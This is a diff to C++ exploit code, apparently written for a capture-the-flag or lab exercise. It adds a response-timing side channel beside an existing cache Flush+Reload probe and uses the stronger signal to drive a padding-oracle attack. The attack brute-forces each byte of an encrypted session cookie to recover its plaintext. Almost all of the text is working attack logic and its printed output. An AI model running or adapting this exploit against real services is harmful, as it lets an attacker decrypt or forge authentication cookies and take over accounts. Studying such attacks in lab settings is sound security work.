@@ -229,6 +229,32 @@ uint64_t flush_reload_once(simple_networking::TCPClient* client, const std::stri
   return probe(g_probe_addr);
 }
 
+// Measure response time (alternative side channel)
+uint64_t measure_response_time(simple_networking::TCPClient* client, const std::string& cookie) {
+  uint32_t start_lo, start_hi, end_lo, end_hi;
+
+  asm volatile("mfence\n\trdtsc" : "=a"(start_lo), "=d"(start_hi));
+
+  client->SendMessage("login " + cookie);
+  client->ReadMessage();
+
+  asm volatile("mfence\n\trdtsc" : "=a"(end_lo), "=d"(end_hi));
+
+  uint64_t start = ((uint64_t)start_hi << 32) | start_lo;
+  uint64_t end = ((uint64_t)end_hi << 32) | end_lo;
+  return end - start;
+}
+
+// Get median response time
+uint64_t median_response_time(simple_networking::TCPClient* client, const std::string& cookie, int samples) {
+  std::vector<uint64_t> times;
+  for (int i = 0; i < samples; i++) {
+    times.push_back(measure_response_time(client, cookie));
+  }
+  std::sort(times.begin(), times.end());
+  return times[samples / 2];
+}
+
 // Measure with many samples, return median probe time
 uint64_t measure_median_probe(simple_networking::TCPClient* client, const std::string& cookie, int samples) {
   std::vector<uint64_t> times;
@@ -302,7 +328,7 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
   std::string corrupted_cookie = base64::base64_encode(corrupted) + "." + hmac_b64;
 
   // Test side channel
-  std::cout << "[+] Testing side channel..." << std::endl;
+  std::cout << "[+] Testing cache side channel..." << std::endl;
 
   uint64_t valid_min, valid_med, valid_max;
   uint64_t invalid_min, invalid_med, invalid_max;
@@ -310,33 +336,52 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
   measure_stats(client, cookie, 50, valid_min, valid_med, valid_max);
   measure_stats(client, corrupted_cookie, 50, invalid_min, invalid_med, invalid_max);
 
-  std::cout << "    Valid:   min=" << valid_min << " med=" << valid_med << " max=" << valid_max << std::endl;
-  std::cout << "    Invalid: min=" << invalid_min << " med=" << invalid_med << " max=" << invalid_max << std::endl;
+  std::cout << "    Cache Valid:   min=" << valid_min << " med=" << valid_med << " max=" << valid_max << std::endl;
+  std::cout << "    Cache Invalid: min=" << invalid_min << " med=" << invalid_med << " max=" << invalid_max << std::endl;
+
+  // Test response timing side channel
+  std::cout << "[+] Testing response timing..." << std::endl;
+  uint64_t valid_time = median_response_time(client, cookie, 50);
+  uint64_t invalid_time = median_response_time(client, corrupted_cookie, 50);
+  std::cout << "    Response Valid:   " << valid_time << " cycles" << std::endl;
+  std::cout << "    Response Invalid: " << invalid_time << " cycles" << std::endl;
+
+  // Decide which side channel to use
+  int64_t cache_diff = (int64_t)invalid_med - (int64_t)valid_med;
+  int64_t timing_diff = (int64_t)invalid_time - (int64_t)valid_time;
+
+  std::cout << "    Cache diff: " << cache_diff << ", Timing diff: " << timing_diff << std::endl;
+
+  // Use timing if it shows better signal (invalid should take longer due to LogError)
+  bool use_timing = (timing_diff > 5000);  // Invalid takes >5000 cycles longer
 
   uint64_t dynamic_threshold = (valid_med + invalid_med) / 2;
 
   int valid_hits = count_hits(client, cookie, 30, dynamic_threshold);
   int invalid_hits = count_hits(client, corrupted_cookie, 30, dynamic_threshold);
-  std::cout << "    Hits (threshold=" << dynamic_threshold << "): valid=" << valid_hits << " invalid=" << invalid_hits << std::endl;
+  std::cout << "    Cache Hits (threshold=" << dynamic_threshold << "): valid=" << valid_hits << " invalid=" << invalid_hits << std::endl;
 
   // Determine method
   bool valid_higher = (valid_hits > invalid_hits + 3);
   bool invalid_higher = (invalid_hits > valid_hits + 3);
 
   std::cout << "[+] Detection: ";
-  if (invalid_higher) {
-    std::cout << "NORMAL (invalid has more hits)" << std::endl;
+  if (use_timing) {
+    std::cout << "TIMING (using response time)" << std::endl;
+  } else if (invalid_higher) {
+    std::cout << "CACHE-NORMAL (invalid has more hits)" << std::endl;
   } else if (valid_higher) {
-    std::cout << "INVERTED (valid has more hits)" << std::endl;
+    std::cout << "CACHE-INVERTED (valid has more hits)" << std::endl;
   } else {
-    std::cout << "WEAK signal" << std::endl;
+    std::cout << "WEAK signal - trying timing" << std::endl;
+    use_timing = true;
   }
 
   // Plaintext: "nobody-XXXXXXXX" + 0x01 padding = 16 bytes
   std::vector<uint8_t> intermediate(16, 0);
   std::vector<uint8_t> recovered(16, 0);
 
-  const int SAMPLES = 31;
+  const int SAMPLES = use_timing ? 15 : 31;  // Fewer samples needed for timing
 
   // Padding oracle attack
   for (int pos = 15; pos >= 0; pos--) {
@@ -352,26 +397,37 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
     }
 
     int best_guess = 0;
+    uint64_t best_time = UINT64_MAX;
     int best_hits = invalid_higher ? INT_MAX : -1;
 
     for (int guess = 0; guess < 256; guess++) {
       modified[pos] = static_cast<std::byte>(guess);
       std::string test_cookie = base64::base64_encode(modified) + "." + hmac_b64;
 
-      int hits = count_hits(client, test_cookie, SAMPLES, dynamic_threshold);
-
-      // Valid padding = LogError NOT called
-      // If invalid_higher: valid padding has FEWER hits (look for minimum)
-      // If valid_higher (inverted): valid padding has MORE hits (look for maximum)
-      if (invalid_higher) {
-        if (hits < best_hits) {
-          best_hits = hits;
+      if (use_timing) {
+        // Timing attack: valid padding = faster response (no LogError)
+        uint64_t time = median_response_time(client, test_cookie, SAMPLES);
+        if (time < best_time) {
+          best_time = time;
           best_guess = guess;
         }
       } else {
-        if (hits > best_hits) {
-          best_hits = hits;
-          best_guess = guess;
+        // Cache attack
+        int hits = count_hits(client, test_cookie, SAMPLES, dynamic_threshold);
+
+        // Valid padding = LogError NOT called
+        // If invalid_higher: valid padding has FEWER hits (look for minimum)
+        // If valid_higher (inverted): valid padding has MORE hits (look for maximum)
+        if (invalid_higher) {
+          if (hits < best_hits) {
+            best_hits = hits;
+            best_guess = guess;
+          }
+        } else {
+          if (hits > best_hits) {
+            best_hits = hits;
+            best_guess = guess;
+          }
         }
       }
     }
@@ -383,7 +439,13 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
     char c = (char)recovered[pos];
     std::cout << "0x" << std::hex << std::setw(2) << std::setfill('0')
               << (int)recovered[pos] << std::dec
-              << " ('" << (isprint(c) ? c : '?') << "') [hits=" << best_hits << "]" << std::endl;
+              << " ('" << (isprint(c) ? c : '?') << "')";
+    if (use_timing) {
+      std::cout << " [time=" << best_time << "]";
+    } else {
+      std::cout << " [hits=" << best_hits << "]";
+    }
+    std::cout << std::endl;
   }
 
   // Extract results
